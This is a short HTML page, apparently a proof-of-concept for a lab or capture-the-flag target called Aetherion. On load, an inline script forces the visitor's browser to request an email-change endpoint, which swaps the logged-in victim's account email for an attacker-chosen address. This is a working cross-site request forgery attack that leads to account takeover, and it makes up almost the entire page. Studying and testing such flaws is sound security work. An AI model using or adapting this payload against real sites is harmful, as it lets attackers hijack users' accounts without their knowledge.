<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Aetherion CSRF probe</title>
<style>
:root{color-scheme:dark}body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(circle at 20% 0,#1a2548,#05070e 60%);color:#dce6ff;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
.card{width:min(720px,90vw);border:1px solid #24304d;border-radius:18px;padding:30px;background:#0b1220;box-shadow:0 24px 80px #0008}
h1{font-size:18px;letter-spacing:.12em;margin:0 0 18px}p{color:#9aacd0;line-height:1.6}code{color:#7dffb2}.status{margin-top:18px;color:#8ea8ff}
</style>
</head>
<body>
<div class="card">
  <h1>AETHERION / CSRF PROBE</h1>
  <p>The victim session is used to call the account email endpoint. The resulting redirect lands on the collaborator beacon.</p>
  <p><code>GET /api/auth/email/change?email=ops.recovery@aetherion.store</code></p>
  <p class="status" id="status">navigating...</p>
</div>
<script>
document.getElementById('status').textContent = 'issuing top-level request...';
location.replace('http://aetherion.local:8080/api/auth/email/change?email=ops.recovery%40aetherion.store');
</script>
</body>
</html>
